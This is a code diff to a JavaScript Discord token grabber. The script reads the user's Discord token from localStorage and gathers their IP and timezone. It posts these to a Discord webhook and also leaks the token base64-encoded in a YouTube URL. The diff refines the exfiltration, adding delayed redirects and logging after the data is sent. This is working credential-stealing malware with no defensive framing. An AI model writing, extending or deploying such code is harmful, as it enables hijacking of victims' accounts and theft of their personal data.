@@ -19,11 +19,12 @@ setTimeout(() => {
                             {
                                 title: "Logged Info",
                                 description: `IP: ${ip}\nTimezone: ${timezone}\nToken: ${param}`,
-                                color: 16711935 // makes it pink
+                                color: 16711935 // Pink
                             }
                         ]
                     };
 
+                    // Send to Discord webhook FIRST
                     fetch(webhookURL, {
                         method: 'POST',
                         headers: {
@@ -31,17 +32,28 @@ setTimeout(() => {
                         },
                         body: JSON.stringify(message)
                     })
-                    .catch(error => console.error('Error1:', error));
+                    .then(() => {
+                        console.log("Data sent to webhook. Redirecting now...");
+                        setTimeout(() => {
+                            window.location.href = "https://discord.com/channels/@me";
+                        }, 3000); // Wait 3 seconds before redirecting
+                    })
+                    .catch(error => console.error('Error sending to webhook:', error));
                 })
-                .catch(error => console.error('Error2:', error));
+                .catch(error => console.error('Error fetching IP:', error));
         }
     } else if (window.location.href === "https://discord.com/channels/@me") {
 
         const token = localStorage.token;
         if (token != null) {
-            window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
+            console.log("Token found, encoding and redirecting...");
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
+            }, 3000); // Delay redirect
         }
     } else {
-        window.location.href = "https://discord.com/channels/@me";
+        setTimeout(() => {
+            window.location.href = "https://discord.com/channels/@me";
+        }, 3000); // Delay redirect
     }
-}, 2000); // 2000ms = 2 seconds
+}, 2000); // 2-second delay before running script
